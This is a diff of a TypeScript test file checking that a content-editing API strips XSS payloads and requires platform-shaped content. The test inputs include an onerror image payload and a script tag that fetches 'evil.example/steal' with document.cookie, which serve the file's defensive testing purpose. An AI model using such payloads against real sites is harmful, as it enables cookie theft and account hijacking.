@@ -116,18 +116,15 @@ describe('PATCH /:jobId/content — XSS sanitization', () => {
     });
   });
 
-  it('strips an onerror handler from a top-level string content field', async () => {
-    const { app, jobsMemory } = await buildApp();
+  it('rejects a bare string for linkedin (platform shape required)', async () => {
+    const { app } = await buildApp();
     const res = await supertest(app)
       .patch(`/api/jobs/${jobId}/content`)
       .set('x-test-user-id', OWNER)
       .send({ content: '<img src=x onerror=alert(1)>' });
 
-    expect(res.status).toBe(200);
-
-    const persisted = jobsMemory.get(jobId).outputs.find((o: any) => o.outputType === 'final').content;
-    expect(persisted).not.toContain('onerror');
-    expect(persisted).not.toContain('alert(1)');
+    expect(res.status).toBe(400);
+    expect(res.body.code).toBe('VALIDATION_ERROR');
   });
 
   it('strips an onerror handler from a string leaf nested inside an object', async () => {
@@ -146,6 +143,14 @@ describe('PATCH /:jobId/content — XSS sanitization', () => {
 
   it('strips an onerror handler from a string leaf nested inside an array of objects (carousel slides shape)', async () => {
     const { app, jobsMemory } = await buildApp();
+    // WHY: platform-shaped validation — carousel arrays only accepted for carousel jobs.
+    jobsMemory.set(jobId, {
+      ...jobsMemory.get(jobId),
+      platform: 'instagram_carousel',
+      outputs: [
+        { agentName: 'writer', outputType: 'final', content: [{ headline: 'Old', body: 'Old' }] },
+      ],
+    });
     const res = await supertest(app)
       .patch(`/api/jobs/${jobId}/content`)
       .set('x-test-user-id', OWNER)
@@ -166,15 +171,23 @@ describe('PATCH /:jobId/content — XSS sanitization', () => {
 
   it('strips a <script> tag in addition to inline event handlers', async () => {
     const { app, jobsMemory } = await buildApp();
-    await supertest(app)
+    const res = await supertest(app)
       .patch(`/api/jobs/${jobId}/content`)
       .set('x-test-user-id', OWNER)
-      .send({ content: 'before<script>fetch("https://evil.example/steal?c="+document.cookie)</script>after' });
+      .send({
+        content: {
+          hook: 'H',
+          body: 'before<script>fetch("https://evil.example/steal?c="+document.cookie)</script>after',
+          cta: 'C',
+          hashtags: [],
+        },
+      });
 
+    expect(res.status).toBe(200);
     const persisted = jobsMemory.get(jobId).outputs.find((o: any) => o.outputType === 'final').content;
-    expect(persisted).not.toContain('<script>');
-    expect(persisted).not.toContain('evil.example');
-    expect(persisted).toBe('beforeafter');
+    expect(persisted.body).not.toContain('<script>');
+    expect(persisted.body).not.toContain('evil.example');
+    expect(persisted.body).toBe('beforeafter');
   });
 
   it('non-owner PATCH still 404s (sanitization does not bypass the ownership check)', async () => {
@@ -182,7 +195,7 @@ describe('PATCH /:jobId/content — XSS sanitization', () => {
     const res = await supertest(app)
       .patch(`/api/jobs/${jobId}/content`)
       .set('x-test-user-id', 'attacker-user-2')
-      .send({ content: '<img src=x onerror=alert(1)>' });
+      .send({ content: { hook: '<img src=x onerror=alert(1)>', body: 'B', cta: 'C' } });
 
     expect(res.status).toBe(404);
   });
